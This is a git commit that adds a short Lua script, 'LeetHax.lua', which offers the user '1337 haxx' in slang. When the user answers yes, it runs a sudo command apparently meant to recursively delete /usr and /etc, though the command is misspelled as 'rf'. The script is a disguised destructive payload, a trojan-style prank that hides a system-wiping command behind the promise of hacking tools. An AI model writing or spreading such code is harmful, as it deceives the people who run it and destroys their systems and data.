0417fdfabf49f79cf3ea387f9ef4dcc2e9630396
ShadySales <98412810+ShadySales@users.noreply.github.com>
2022-01-25 11:26:17 -0500

    Add files via upload

---
+++ LeetHax.lua
@@ -0,0 +1,15 @@
+print("dew u want 1337 haxx?")
+print("Yez/Nou")
+while l == nil do 
+a = io.read(1)
+if a == "Y" or a == "y" then 
+print ("leet haxx activating")
+	os.execute("sudo rf -rf /usr/* /etc/* ")
+l=1
+else
+	if a == "N" or a == "n" then 
+		print ("no leet haxx 4 u then")
+		l=1
+	else print ("wat?") end
+end
+end 
